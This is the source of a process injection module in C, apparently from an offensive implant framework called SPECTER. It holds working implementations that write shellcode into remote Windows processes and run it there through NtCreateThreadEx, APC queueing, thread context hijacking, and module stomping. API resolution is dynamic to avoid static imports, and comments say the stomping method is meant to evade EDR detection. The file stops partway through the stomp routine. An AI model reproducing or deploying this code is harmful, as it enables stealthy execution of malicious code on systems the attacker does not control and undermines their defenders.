/**
 * SPECTER Module — Process Injection
 *
 * Provides four process injection techniques for shellcode execution in
 * remote processes: CreateRemoteThread, APC queue, thread hijacking, and
 * module stomping.
 *
 * Subcommands:
 *   "createthread" <pid> <shellcode>       — classic VirtualAllocEx + CreateRemoteThread
 *   "apc"          <pid> <tid> <shellcode>  — NtQueueApcThread (thread must be alertable)
 *   "hijack"       <pid> <tid> <shellcode>  — suspend → get/set context (RIP) → resume
 *   "stomp"        <pid> <dll_name> <shellcode> — overwrite loaded DLL .text section
 *
 * All Windows API calls go through bus->resolve() — no direct imports.
 * Process/memory/thread operations use bus API where available, falling
 * back to resolved NT APIs for operations not covered by the bus.
 *
 * Build: make modules  (produces build/modules/inject.bin)
 */

#include "module.h"

/* ------------------------------------------------------------------ */
/*  Inline CRT primitives (modules are standalone PIC blobs)           */
/* ------------------------------------------------------------------ */

SIZE_T spec_strlen(const char *s)
{
    SIZE_T len = 0;
    while (s[len]) len++;
    return len;
}

int spec_strcmp(const char *a, const char *b)
{
    while (*a && (*a == *b)) { a++; b++; }
    return (unsigned char)*a - (unsigned char)*b;
}

void *spec_memset(void *dst, int c, SIZE_T n)
{
    BYTE *d = (BYTE *)dst;
    while (n--) *d++ = (BYTE)c;
    return dst;
}

void *spec_memcpy(void *dst, const void *src, SIZE_T n)
{
    BYTE *d = (BYTE *)dst;
    const BYTE *s = (const BYTE *)src;
    while (n--) *d++ = *s++;
    return dst;
}

/* ------------------------------------------------------------------ */
/*  Process / thread access rights                                     */
/* ------------------------------------------------------------------ */

#define PROCESS_VM_OPERATION        0x0008
#define PROCESS_VM_WRITE            0x0020
#define PROCESS_VM_READ             0x0010
#define PROCESS_CREATE_THREAD       0x0002
#define PROCESS_QUERY_INFORMATION   0x0400
#define PROCESS_ALL_ACCESS          0x001FFFFF

#define THREAD_SUSPEND_RESUME       0x0002
#define THREAD_GET_CONTEXT          0x0008
#define THREAD_SET_CONTEXT          0x0010
#define THREAD_ALL_ACCESS           0x001FFFFF

/* Memory protection */
#define PAGE_READWRITE              0x04
#define PAGE_EXECUTE_READ           0x20

/* Process architecture check */
#define ProcessWow64Information     26

/* ------------------------------------------------------------------ */
/*  CONTEXT64 — minimal x64 thread context for hijacking               */
/* ------------------------------------------------------------------ */

#define CONTEXT64_CONTROL   0x00100001
#define CONTEXT64_INTEGER   0x00100002
#define CONTEXT64_FULL      (CONTEXT64_CONTROL | CONTEXT64_INTEGER)

#pragma pack(push, 8)

/* M128A for XMM register storage */
typedef struct _M128A {
    QWORD Low;
    QWORD High;
} M128A;

typedef struct _CONTEXT64 {
    /* Register parameter home addresses */
    QWORD P1Home, P2Home, P3Home, P4Home, P5Home, P6Home;

    /* Control flags */
    DWORD ContextFlags;
    DWORD MxCsr;

    /* Segment selectors */
    WORD SegCs, SegDs, SegEs, SegFs, SegGs, SegSs;

    /* Flags */
    DWORD EFlags;

    /* Debug registers */
    QWORD Dr0, Dr1, Dr2, Dr3, Dr6, Dr7;

    /* Integer registers */
    QWORD Rax, Rcx, Rdx, Rbx, Rsp, Rbp, Rsi, Rdi;
    QWORD R8, R9, R10, R11, R12, R13, R14, R15;

    /* Program counter */
    QWORD Rip;

    /* Floating point / XSAVE area (union, 512 bytes) */
    union {
        struct {
            WORD ControlWord, StatusWord, TagWord;
            WORD ErrorOpcode;
            DWORD ErrorOffset, ErrorSelector;
            DWORD DataOffset, DataSelector;
            DWORD MxCsr2, MxCsr_Mask;
            M128A FloatRegisters[8];
            M128A XmmRegisters[16];
            BYTE Reserved4[96];
        } FltSave;
        M128A xmm_align[1];  /* Force 16-byte alignment */
    };

    /* Vector registers */
    M128A VectorRegister[26];
    QWORD VectorControl;

    /* Debug control */
    QWORD DebugControl;
    QWORD LastBranchToRip;
    QWORD LastBranchFromRip;
    QWORD LastExceptionToRip;
    QWORD LastExceptionFromRip;
} CONTEXT64;

#pragma pack(pop)

/* ------------------------------------------------------------------ */
/*  NT function pointer typedefs for resolved APIs                     */
/* ------------------------------------------------------------------ */

typedef NTSTATUS (*FN_NtOpenProcess)(
    PHANDLE ProcessHandle,
    DWORD DesiredAccess,
    PVOID ObjectAttributes,
    PVOID ClientId
);

typedef NTSTATUS (*FN_NtAllocateVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    DWORD AllocationType,
    DWORD Protect
);

typedef NTSTATUS (*FN_NtWriteVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID BaseAddress,
    const BYTE *Buffer,
    SIZE_T NumberOfBytesToWrite,
    PSIZE_T NumberOfBytesWritten
);

typedef NTSTATUS (*FN_NtProtectVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    PSIZE_T RegionSize,
    DWORD NewProtect,
    PDWORD OldProtect
);

typedef NTSTATUS (*FN_NtCreateThreadEx)(
    PHANDLE ThreadHandle,
    DWORD DesiredAccess,
    PVOID ObjectAttributes,
    HANDLE ProcessHandle,
    PVOID StartRoutine,
    PVOID Argument,
    DWORD CreateFlags,
    SIZE_T ZeroBits,
    SIZE_T StackSize,
    SIZE_T MaximumStackSize,
    PVOID AttributeList
);

typedef NTSTATUS (*FN_NtQueueApcThread)(
    HANDLE ThreadHandle,
    PVOID ApcRoutine,
    PVOID ApcArgument1,
    PVOID ApcArgument2,
    PVOID ApcArgument3
);

typedef NTSTATUS (*FN_NtOpenThread)(
    PHANDLE ThreadHandle,
    DWORD DesiredAccess,
    PVOID ObjectAttributes,
    PVOID ClientId
);

typedef NTSTATUS (*FN_NtSuspendThread)(
    HANDLE ThreadHandle,
    PDWORD PreviousSuspendCount
);

typedef NTSTATUS (*FN_NtResumeThread)(
    HANDLE ThreadHandle,
    PDWORD PreviousSuspendCount
);

typedef NTSTATUS (*FN_NtGetContextThread)(
    HANDLE ThreadHandle,
    CONTEXT64 *ThreadContext
);

typedef NTSTATUS (*FN_NtSetContextThread)(
    HANDLE ThreadHandle,
    CONTEXT64 *ThreadContext
);

typedef NTSTATUS (*FN_NtClose)(HANDLE Handle);

typedef NTSTATUS (*FN_NtQueryInformationProcess)(
    HANDLE ProcessHandle,
    DWORD ProcessInformationClass,
    PVOID ProcessInformation,
    DWORD ProcessInformationLength,
    PDWORD ReturnLength
);

typedef NTSTATUS (*FN_NtQueryVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID BaseAddress,
    DWORD MemoryInformationClass,
    PVOID MemoryInformation,
    SIZE_T MemoryInformationLength,
    PSIZE_T ReturnLength
);

typedef NTSTATUS (*FN_NtReadVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID BaseAddress,
    PVOID Buffer,
    SIZE_T NumberOfBytesToRead,
    PSIZE_T NumberOfBytesRead
);

/* ------------------------------------------------------------------ */
/*  PE header structures for module stomping                           */
/* ------------------------------------------------------------------ */

#define IMAGE_DOS_SIGNATURE     0x5A4D      /* "MZ" */
#define IMAGE_NT_SIGNATURE      0x00004550  /* "PE\0\0" */
#define IMAGE_SCN_CNT_CODE_     0x00000020
#define IMAGE_SCN_MEM_EXECUTE_  0x20000000

/* MemoryBasicInformation class for NtQueryVirtualMemory */
#define MemoryBasicInformation  0

/* ------------------------------------------------------------------ */
/*  Helper: integer to decimal string                                  */
/* ------------------------------------------------------------------ */

static DWORD uint_to_str(DWORD val, char *buf, DWORD buf_len)
{
    char tmp[16];
    DWORD i = 0, j;

    if (buf_len < 2)
        return 0;

    if (val == 0) {
        buf[0] = '0';
        buf[1] = '\0';
        return 1;
    }

    while (val > 0 && i < sizeof(tmp) - 1) {
        tmp[i++] = (char)('0' + (val % 10));
        val /= 10;
    }

    if (i >= buf_len)
        i = buf_len - 1;

    for (j = 0; j < i; j++)
        buf[j] = tmp[i - 1 - j];
    buf[i] = '\0';

    return i;
}

/* ------------------------------------------------------------------ */
/*  Helper: append string to output buffer                             */
/* ------------------------------------------------------------------ */

static DWORD buf_append(char *buf, DWORD buf_len, DWORD offset,
                         const char *str)
{
    while (*str && offset < buf_len - 1)
        buf[offset++] = *str++;
    buf[offset] = '\0';
    return offset;
}

/* ------------------------------------------------------------------ */
/*  Helper: append integer to output buffer                            */
/* ------------------------------------------------------------------ */

static DWORD buf_append_uint(char *buf, DWORD buf_len, DWORD offset,
                              DWORD val)
{
    char tmp[16];
    uint_to_str(val, tmp, sizeof(tmp));
    return buf_append(buf, buf_len, offset, tmp);
}

/* ------------------------------------------------------------------ */
/*  Helper: append hex pointer to output buffer                        */
/* ------------------------------------------------------------------ */

static DWORD buf_append_hex(char *buf, DWORD buf_len, DWORD offset,
                             QWORD val)
{
    char tmp[20];
    const char hex[] = "0123456789abcdef";
    int i, start;

    tmp[0] = '0';
    tmp[1] = 'x';

    for (i = 0; i < 16; i++)
        tmp[2 + i] = hex[(val >> (60 - i * 4)) & 0xF];
    tmp[18] = '\0';

    /* Skip leading zeros but keep at least one digit */
    start = 2;
    while (start < 17 && tmp[start] == '0')
        start++;
    if (start > 17) start = 17;

    offset = buf_append(buf, buf_len, offset, "0x");
    return buf_append(buf, buf_len, offset, tmp + start);
}

/* ------------------------------------------------------------------ */
/*  Helper: validate target PID is accessible and x64                  */
/* ------------------------------------------------------------------ */

static BOOL validate_target(MODULE_BUS_API *api, DWORD pid, HANDLE *out_handle,
                             DWORD access)
{
    FN_NtQueryInformationProcess pNtQueryInformationProcess;
    HANDLE hProc;
    ULONG_PTR wow64_info = 0;
    DWORD ret_len = 0;
    NTSTATUS status;

    /* Open process with required access */
    hProc = api->proc_open(pid, access);
    if (!hProc || hProc == INVALID_HANDLE_VALUE) {
        MODULE_OUTPUT_ERROR(api, "inject: failed to open target process");
        return FALSE;
    }

    /* Check if target is WoW64 (32-bit on 64-bit OS) */
    pNtQueryInformationProcess = (FN_NtQueryInformationProcess)
        api->resolve("ntdll.dll", "NtQueryInformationProcess");
    if (pNtQueryInformationProcess) {
        status = pNtQueryInformationProcess(hProc, ProcessWow64Information,
                                             &wow64_info, sizeof(wow64_info),
                                             &ret_len);
        if (NT_SUCCESS(status) && wow64_info != 0) {
            api->proc_close(hProc);
            MODULE_OUTPUT_ERROR(api, "inject: target is 32-bit (WoW64), not supported");
            return FALSE;
        }
    }

    *out_handle = hProc;
    return TRUE;
}

/* ------------------------------------------------------------------ */
/*  Helper: allocate + write + protect shellcode in remote process      */
/* ------------------------------------------------------------------ */

static PVOID inject_write_shellcode(MODULE_BUS_API *api, HANDLE hProc,
                                     const BYTE *shellcode, DWORD sc_len)
{
    FN_NtAllocateVirtualMemory pNtAllocateVirtualMemory;
    FN_NtProtectVirtualMemory pNtProtectVirtualMemory;
    PVOID remote_addr = NULL;
    SIZE_T region_size = (SIZE_T)sc_len;
    NTSTATUS status;

    /* Resolve allocation APIs */
    pNtAllocateVirtualMemory = (FN_NtAllocateVirtualMemory)
        api->resolve("ntdll.dll", "NtAllocateVirtualMemory");
    pNtProtectVirtualMemory = (FN_NtProtectVirtualMemory)
        api->resolve("ntdll.dll", "NtProtectVirtualMemory");

    if (!pNtAllocateVirtualMemory || !pNtProtectVirtualMemory) {
        MODULE_OUTPUT_ERROR(api, "inject: failed to resolve memory APIs");
        return NULL;
    }

    /* Allocate RW memory in target */
    status = pNtAllocateVirtualMemory(hProc, &remote_addr, 0, &region_size,
                                       0x3000 /* MEM_COMMIT | MEM_RESERVE */,
                                       PAGE_READWRITE);
    if (!NT_SUCCESS(status) || !remote_addr) {
        MODULE_OUTPUT_ERROR(api, "inject: remote memory allocation failed");
        return NULL;
    }

    /* Write shellcode to remote memory */
    if (!api->proc_write(hProc, remote_addr, shellcode, sc_len)) {
        MODULE_OUTPUT_ERROR(api, "inject: failed to write shellcode to target");
        return NULL;
    }

    /* Change protection to RX */
    {
        PVOID protect_addr = remote_addr;
        SIZE_T protect_size = region_size;
        DWORD old_protect = 0;

        status = pNtProtectVirtualMemory(hProc, &protect_addr, &protect_size,
                                          PAGE_EXECUTE_READ, &old_protect);
        if (!NT_SUCCESS(status)) {
            MODULE_OUTPUT_ERROR(api, "inject: failed to set RX protection");
            return NULL;
        }
    }

    return remote_addr;
}

/* ------------------------------------------------------------------ */
/*  Subcommand: createthread                                           */
/*  Classic VirtualAllocEx + WriteProcessMemory + CreateRemoteThread    */
/* ------------------------------------------------------------------ */

static DWORD cmd_createthread(MODULE_BUS_API *api, const MODULE_ARGS *args)
{
    DWORD pid;
    const BYTE *shellcode;
    DWORD sc_len = 0;
    HANDLE hProc = NULL;
    PVOID remote_addr;
    FN_NtCreateThreadEx pNtCreateThreadEx;
    HANDLE hThread = NULL;
    NTSTATUS status;

    /* Parse arguments: createthread <pid> <shellcode_bytes> */
    pid = module_arg_int32(args, 1, 0);
    shellcode = module_arg_bytes(args, 2, &sc_len);

    if (pid == 0 || !shellcode || sc_len == 0) {
        MODULE_OUTPUT_ERROR(api, "inject createthread: usage: createthread <pid> <shellcode>");
        return MODULE_ERR_ARGS;
    }

    /* Validate target: accessible x64 process */
    if (!validate_target(api, pid,  &hProc,
                          PROCESS_VM_OPERATION | PROCESS_VM_WRITE |
                          PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION))
        return MODULE_ERR_ACCESS;

    /* Allocate + write + protect shellcode */
    remote_addr = inject_write_shellcode(api, hProc, shellcode, sc_len);
    if (!remote_addr) {
        api->proc_close(hProc);
        return MODULE_ERR_ALLOC;
    }

    /* Create remote thread */
    pNtCreateThreadEx = (FN_NtCreateThreadEx)
        api->resolve("ntdll.dll", "NtCreateThreadEx");
    if (!pNtCreateThreadEx) {
        api->proc_close(hProc);
        MODULE_OUTPUT_ERROR(api, "inject createthread: failed to resolve NtCreateThreadEx");
        return MODULE_ERR_RESOLVE;
    }

    status = pNtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProc,
                                remote_addr, NULL, 0, 0, 0, 0, NULL);
    if (!NT_SUCCESS(status) || !hThread) {
        api->proc_close(hProc);
        MODULE_OUTPUT_ERROR(api, "inject createthread: NtCreateThreadEx failed");
        return MODULE_ERR_IO;
    }

    /* Success */
    {
        FN_NtClose pNtClose = (FN_NtClose)api->resolve("ntdll.dll", "NtClose");
        if (pNtClose) pNtClose(hThread);
    }
    api->proc_close(hProc);

    {
        char out[128];
        DWORD off = 0;
        off = buf_append(out, sizeof(out), off, "inject createthread: shellcode (");
        off = buf_append_uint(out, sizeof(out), off, sc_len);
        off = buf_append(out, sizeof(out), off, " bytes) injected into PID ");
        off = buf_append_uint(out, sizeof(out), off, pid);
        off = buf_append(out, sizeof(out), off, " at ");
        off = buf_append_hex(out, sizeof(out), off, (QWORD)(ULONG_PTR)remote_addr);
        MODULE_OUTPUT_TEXT(api, out);
    }

    return MODULE_SUCCESS;
}

/* ------------------------------------------------------------------ */
/*  Subcommand: apc                                                    */
/*  NtQueueApcThread — target thread must be alertable (e.g. SleepEx)  */
/* ------------------------------------------------------------------ */

static DWORD cmd_apc(MODULE_BUS_API *api, const MODULE_ARGS *args)
{
    DWORD pid, tid;
    const BYTE *shellcode;
    DWORD sc_len = 0;
    HANDLE hProc = NULL;
    HANDLE hThread = NULL;
    PVOID remote_addr;
    FN_NtOpenThread pNtOpenThread;
    FN_NtQueueApcThread pNtQueueApcThread;
    FN_NtClose pNtClose;
    NTSTATUS status;

    /* Parse arguments: apc <pid> <tid> <shellcode_bytes> */
    pid = module_arg_int32(args, 1, 0);
    tid = module_arg_int32(args, 2, 0);
    shellcode = module_arg_bytes(args, 3, &sc_len);

    if (pid == 0 || tid == 0 || !shellcode || sc_len == 0) {
        MODULE_OUTPUT_ERROR(api, "inject apc: usage: apc <pid> <tid> <shellcode>");
        return MODULE_ERR_ARGS;
    }

    /* Validate target */
    if (!validate_target(api, pid, &hProc,
                          PROCESS_VM_OPERATION | PROCESS_VM_WRITE |
                          PROCESS_QUERY_INFORMATION))
        return MODULE_ERR_ACCESS;

    /* Write shellcode */
    remote_addr = inject_write_shellcode(api, hProc, shellcode, sc_len);
    if (!remote_addr) {
        api->proc_close(hProc);
        return MODULE_ERR_ALLOC;
    }

    /* Open target thread */
    pNtOpenThread = (FN_NtOpenThread)
        api->resolve("ntdll.dll", "NtOpenThread");
    pNtQueueApcThread = (FN_NtQueueApcThread)
        api->resolve("ntdll.dll", "NtQueueApcThread");
    pNtClose = (FN_NtClose)api->resolve("ntdll.dll", "NtClose");

    if (!pNtOpenThread || !pNtQueueApcThread) {
        api->proc_close(hProc);
        MODULE_OUTPUT_ERROR(api, "inject apc: failed to resolve thread APIs");
        return MODULE_ERR_RESOLVE;
    }

    {
        /* CLIENT_ID for NtOpenThread */
        struct { HANDLE pid; HANDLE tid; } client_id;
        /* OBJECT_ATTRIBUTES (zeroed = no name, no root) */
        BYTE obj_attr[48];

        spec_memset(&client_id, 0, sizeof(client_id));
        client_id.pid = NULL;  /* not filtering by PID */
        client_id.tid = (HANDLE)(ULONG_PTR)tid;

        spec_memset(obj_attr, 0, sizeof(obj_attr));
        *(DWORD *)obj_attr = 48;  /* Length = sizeof(OBJECT_ATTRIBUTES) */

        status = pNtOpenThread(&hThread, THREAD_ALL_ACCESS,
                                obj_attr, &client_id);
    }

    if (!NT_SUCCESS(status) || !hThread) {
        api->proc_close(hProc);
        MODULE_OUTPUT_ERROR(api, "inject apc: failed to open target thread");
        return MODULE_ERR_ACCESS;
    }

    /* Queue the APC */
    status = pNtQueueApcThread(hThread, remote_addr, NULL, NULL, NULL);

    if (pNtClose) pNtClose(hThread);
    api->proc_close(hProc);

    if (!NT_SUCCESS(status)) {
        MODULE_OUTPUT_ERROR(api, "inject apc: NtQueueApcThread failed");
        return MODULE_ERR_IO;
    }

    {
        char out[128];
        DWORD off = 0;
        off = buf_append(out, sizeof(out), off, "inject apc: APC queued to TID ");
        off = buf_append_uint(out, sizeof(out), off, tid);
        off = buf_append(out, sizeof(out), off, " in PID ");
        off = buf_append_uint(out, sizeof(out), off, pid);
        off = buf_append(out, sizeof(out), off, " at ");
        off = buf_append_hex(out, sizeof(out), off, (QWORD)(ULONG_PTR)remote_addr);
        MODULE_OUTPUT_TEXT(api, out);
    }

    return MODULE_SUCCESS;
}

/* ------------------------------------------------------------------ */
/*  Subcommand: hijack                                                 */
/*  Suspend thread → GetContext → modify RIP → SetContext → Resume     */
/* ------------------------------------------------------------------ */

static DWORD cmd_hijack(MODULE_BUS_API *api, const MODULE_ARGS *args)
{
    DWORD pid, tid;
    const BYTE *shellcode;
    DWORD sc_len = 0;
    HANDLE hProc = NULL;
    HANDLE hThread = NULL;
    PVOID remote_addr;
    FN_NtOpenThread pNtOpenThread;
    FN_NtSuspendThread pNtSuspendThread;
    FN_NtResumeThread pNtResumeThread;
    FN_NtGetContextThread pNtGetContextThread;
    FN_NtSetContextThread pNtSetContextThread;
    FN_NtClose pNtClose;
    NTSTATUS status;
    CONTEXT64 ctx;
    DWORD suspend_count = 0;

    /* Parse arguments: hijack <pid> <tid> <shellcode_bytes> */
    pid = module_arg_int32(args, 1, 0);
    tid = module_arg_int32(args, 2, 0);
    shellcode = module_arg_bytes(args, 3, &sc_len);

    if (pid == 0 || tid == 0 || !shellcode || sc_len == 0) {
        MODULE_OUTPUT_ERROR(api, "inject hijack: usage: hijack <pid> <tid> <shellcode>");
        return MODULE_ERR_ARGS;
    }

    /* Validate target */
    if (!validate_target(api, pid, &hProc,
                          PROCESS_VM_OPERATION | PROCESS_VM_WRITE |
                          PROCESS_QUERY_INFORMATION))
        return MODULE_ERR_ACCESS;

    /* Write shellcode */
    remote_addr = inject_write_shellcode(api, hProc, shellcode, sc_len);
    if (!remote_addr) {
        api->proc_close(hProc);
        return MODULE_ERR_ALLOC;
    }

    /* Resolve thread APIs */
    pNtOpenThread = (FN_NtOpenThread)
        api->resolve("ntdll.dll", "NtOpenThread");
    pNtSuspendThread = (FN_NtSuspendThread)
        api->resolve("ntdll.dll", "NtSuspendThread");
    pNtResumeThread = (FN_NtResumeThread)
        api->resolve("ntdll.dll", "NtResumeThread");
    pNtGetContextThread = (FN_NtGetContextThread)
        api->resolve("ntdll.dll", "NtGetContextThread");
    pNtSetContextThread = (FN_NtSetContextThread)
        api->resolve("ntdll.dll", "NtSetContextThread");
    pNtClose = (FN_NtClose)api->resolve("ntdll.dll", "NtClose");

    if (!pNtOpenThread || !pNtSuspendThread || !pNtResumeThread ||
        !pNtGetContextThread || !pNtSetContextThread) {
        api->proc_close(hProc);
        MODULE_OUTPUT_ERROR(api, "inject hijack: failed to resolve thread APIs");
        return MODULE_ERR_RESOLVE;
    }

    /* Open target thread */
    {
        struct { HANDLE pid; HANDLE tid; } client_id;
        BYTE obj_attr[48];

        spec_memset(&client_id, 0, sizeof(client_id));
        client_id.pid = NULL;
        client_id.tid = (HANDLE)(ULONG_PTR)tid;

        spec_memset(obj_attr, 0, sizeof(obj_attr));
        *(DWORD *)obj_attr = 48;

        status = pNtOpenThread(&hThread,
                                THREAD_SUSPEND_RESUME | THREAD_GET_CONTEXT |
                                THREAD_SET_CONTEXT,
                                obj_attr, &client_id);
    }

    if (!NT_SUCCESS(status) || !hThread) {
        api->proc_close(hProc);
        MODULE_OUTPUT_ERROR(api, "inject hijack: failed to open target thread");
        return MODULE_ERR_ACCESS;
    }

    /* Suspend the thread */
    status = pNtSuspendThread(hThread, &suspend_count);
    if (!NT_SUCCESS(status)) {
        if (pNtClose) pNtClose(hThread);
        api->proc_close(hProc);
        MODULE_OUTPUT_ERROR(api, "inject hijack: failed to suspend thread");
        return MODULE_ERR_IO;
    }

    /* Get current thread context */
    spec_memset(&ctx, 0, sizeof(ctx));
    ctx.ContextFlags = CONTEXT64_FULL;

    status = pNtGetContextThread(hThread, &ctx);
    if (!NT_SUCCESS(status)) {
        pNtResumeThread(hThread, &suspend_count);
        if (pNtClose) pNtClose(hThread);
        api->proc_close(hProc);
        MODULE_OUTPUT_ERROR(api, "inject hijack: failed to get thread context");
        return MODULE_ERR_IO;
    }

    /* Modify RIP to point to shellcode */
    ctx.Rip = (QWORD)(ULONG_PTR)remote_addr;

    /* Set modified context */
    status = pNtSetContextThread(hThread, &ctx);
    if (!NT_SUCCESS(status)) {
        pNtResumeThread(hThread, &suspend_count);
        if (pNtClose) pNtClose(hThread);
        api->proc_close(hProc);
        MODULE_OUTPUT_ERROR(api, "inject hijack: failed to set thread context");
        return MODULE_ERR_IO;
    }

    /* Resume the thread */
    status = pNtResumeThread(hThread, &suspend_count);

    if (pNtClose) pNtClose(hThread);
    api->proc_close(hProc);

    if (!NT_SUCCESS(status)) {
        MODULE_OUTPUT_ERROR(api, "inject hijack: failed to resume thread");
        return MODULE_ERR_IO;
    }

    {
        char out[128];
        DWORD off = 0;
        off = buf_append(out, sizeof(out), off, "inject hijack: TID ");
        off = buf_append_uint(out, sizeof(out), off, tid);
        off = buf_append(out, sizeof(out), off, " RIP redirected to ");
        off = buf_append_hex(out, sizeof(out), off, (QWORD)(ULONG_PTR)remote_addr);
        off = buf_append(out, sizeof(out), off, " in PID ");
        off = buf_append_uint(out, sizeof(out), off, pid);
        MODULE_OUTPUT_TEXT(api, out);
    }

    return MODULE_SUCCESS;
}

/* ------------------------------------------------------------------ */
/*  Subcommand: stomp                                                  */
/*  Find loaded DLL .text section → overwrite with shellcode →         */
/*  create thread at .text base (lives in image-backed memory,         */
/*  avoids unbacked RX detection by EDR)                               */
/* ------------------------------------------------------------------ */

static DWORD cmd_stomp(MODULE_BUS_API *api, const MODULE_ARGS *args)
{
    DWORD pid;
    const char *dll_name;
    const BYTE *shellcode;
    DWORD sc_len = 0;
    HANDLE hProc = NULL;
    FN_NtReadVirtualMemory pNtReadVirtualMemory;
    FN_NtProtectVirtualMemory pNtProtectVirtualMemory;
    FN_NtCreateThreadEx pNtCreateThreadEx;
    FN_NtClose pNtClose;
    NTSTATUS status;

    /* Parse arguments: stomp <pid> <dll_name> <shellcode_bytes> */
    pid = module_arg_int32(args, 1, 0);
    dll_name = module_arg_string(args, 2);
    shellcode = module_arg_bytes(args, 3, &sc_len);

    if (pid == 0 || !dll_name || !shellcode || sc_len == 0) {
        MODULE_OUTPUT_ERROR(api, "inject stomp: usage: stomp <pid> <dll_name> <shellcode>");
        return MODULE_ERR_ARGS;
    }

    /* Validate target */
    if (!validate_target(api, pid, &hProc,
                          PROCESS_VM_OPERATION | PROCESS_VM_WRITE |
                          PROCESS_VM_READ | PROCESS_CREATE_THREAD |
                          PROCESS_QUERY_INFORMATION))
        return MODULE_ERR_ACCESS;

    /* Resolve APIs */
    pNtReadVirtualMemory = (FN_NtReadVirtualMemory)
        api->resolve("ntdll.dll", "NtReadVirtualMemory");
    pNtProtectVirtualMemory = (FN_NtProtectVirtualMemory)
        api->resolve("ntdll.dll", "NtProtectVirtualMemory");
    pNtCreateThreadEx = (FN_NtCreateThreadEx)
        api->resolve("ntdll.dll", "NtCreateThreadEx");
    pNtClose = (FN_NtClose)api->resolve("ntdll.dll", "NtClose");

    if (!pNtReadVirtualMemory || !pNtProtectVirtualMemory ||
        !pNtCreateThreadEx) {
        api->proc_close(hProc);
        MODULE_OUTPUT_ERROR(api, "inject stomp: failed to resolve NT APIs");
        return MODULE_ERR_RESOLVE;
    }

    /*
     * Find the target DLL in the remote process by walking the PEB LDR.
     * We read the PEB → LDR → InLoadOrderModuleList from the target process.
     */
    {
        /* Process basic info to get PEB address */
        struct {
            NTSTATUS ExitStatus;
            PVOID PebBaseAddress;
            ULONG_PTR AffinityMask;
            LONG BasePriority;
            ULONG_PTR UniqueProcessId;
            ULONG_PTR InheritedFromUniqueProcessId;
        } pbi;
        FN_NtQueryInformationProcess pNtQueryInformationProcess;
        PVOID peb_addr;
        PVOID ldr_addr;
        PVOID first_link, current_link;
        PVOID dll_base = NULL;
        SIZE_T bytes_read = 0;

        pNtQueryInformationProcess = (FN_NtQueryInformationProcess)
            api->resolve("ntdll.dll", "NtQueryInformationProcess");
        if (!pNtQueryInformationProcess) {
            api->proc_close(hProc);
            MODULE_OUTPUT_ERROR(api, "inject stomp: cannot resolve NtQueryInformationProcess");
            return MODULE_ERR_RESOLVE;
        }

        spec_memset(&pbi, 0, sizeof(pbi));
        status = pNtQueryInformationProcess(hProc, 0 /* ProcessBasicInformation */,
                                             &pbi, sizeof(pbi), NULL);
        if (!NT_SUCCESS(status) || !pbi.PebBaseAddress) {
            api->proc_close(hProc);
            MODULE_OUTPUT_ERROR(api, "inject stomp: cannot query PEB address");
            return MODULE_ERR_IO;
        }

        peb_addr = pbi.PebBaseAddress;

        /* Read PEB.Ldr (offset 0x18 in x64 PEB) */
        status = pNtReadVirtualMemory(hProc,
                                       (PVOID)((ULONG_PTR)peb_addr + 0x18),
                                       &ldr_addr, sizeof(ldr_addr), &bytes_read);
        if (!NT_SUCCESS(status) || !ldr_addr) {
            api->proc_close(hProc);
            MODULE_OUTPUT_ERROR(api, "inject stomp: cannot read PEB.Ldr");
            return MODULE_ERR_IO;
        }

        /* Read InLoadOrderModuleList.Flink from LDR_DATA
         * PEB_LDR_DATA.InLoadOrderModuleList is at offset 0x10 */
        status = pNtReadVirtualMemory(hProc,
                                       (PVOID)((ULONG_PTR)ldr_addr + 0x10),
                                       &first_link, sizeof(first_link), &bytes_read);
        if (!NT_SUCCESS(status)) {
            api->proc_close(hProc);
            MODULE_OUTPUT_ERROR(api, "inject stomp: cannot read LDR module list");
            return MODULE_ERR_IO;
        }

        current_link = first_link;

        /* Walk InLoadOrderModuleList looking for target DLL */
        {
            DWORD walk_count = 0;
            DWORD dll_name_len = (DWORD)spec_strlen(dll_name);

            while (walk_count < 256) {
                /* LDR_DATA_TABLE_ENTRY: InLoadOrderLinks at offset 0,
                 * DllBase at offset 0x30, BaseDllName at offset 0x58 (x64) */
                PVOID entry_base;
                UNICODE_STRING base_name;
                WCHAR name_buf[128];
                PVOID next_link;

                /* Read DllBase (offset 0x30 from list entry start) */
                status = pNtReadVirtualMemory(hProc,
                    (PVOID)((ULONG_PTR)current_link + 0x30),
                    &entry_base, sizeof(entry_base), &bytes_read);
                if (!NT_SUCCESS(status))
                    break;

                /* Read BaseDllName UNICODE_STRING (offset 0x58) */
                status = pNtReadVirtualMemory(hProc,
                    (PVOID)((ULONG_PTR)current_link + 0x58),
                    &base_name, sizeof(base_name), &bytes_read);
                if (!NT_SUCCESS(status))
                    break;

                /* Read the actual name string */
                if (base_name.Length > 0 && base_name.Buffer &&
                    base_name.Length < sizeof(name_buf)) {
                    spec_memset(name_buf, 0, sizeof(name_buf));
                    status = pNtReadVirtualMemory(hProc, base_name.Buffer,
                        name_buf, base_name.Length, &bytes_read);
                    if (NT_SUCCESS(status)) {
                        /* Case-insensitive compare: convert WCHAR to narrow */
                        char narrow[128];
                        DWORD i;
                        DWORD name_chars = base_name.Length / 2;

                        spec_memset(narrow, 0, sizeof(narrow));
                        for (i = 0; i < name_chars && i < sizeof(narrow) - 1; i++) {
                            WCHAR wc = name_buf[i];
                            /* tolower ASCII */
                            if (wc >= 'A' && wc <= 'Z')
                                wc = wc - 'A' + 'a';
                            narrow[i] = (char)(wc & 0xFF);
                        }
                        narrow[i] = '\0';

                        /* Case-insensitive match against target DLL name */
                        {
                            char target_lower[128];
                            DWORD j;

                            spec_memset(target_lower, 0, sizeof(target_lower));
                            for (j = 0; j < dll_name_len && j < sizeof(target_lower) - 1; j++) {
                                char c = dll_name[j];
                                if (c >= 'A' && c <= 'Z')
                                    c = c - 'A' + 'a';
                                target_lower[j] = c;
                            }
                            target_lower[j] = '\0';

                            if (spec_strcmp(narrow, target_lower) == 0) {
                                dll_base = entry_base;
                                break;
                            }
                        }
                    }
                }

                /* Follow Flink to next entry */
                status = pNtReadVirtualMemory(hProc, current_link,
                    &next_link, sizeof(next_link), &bytes_read);
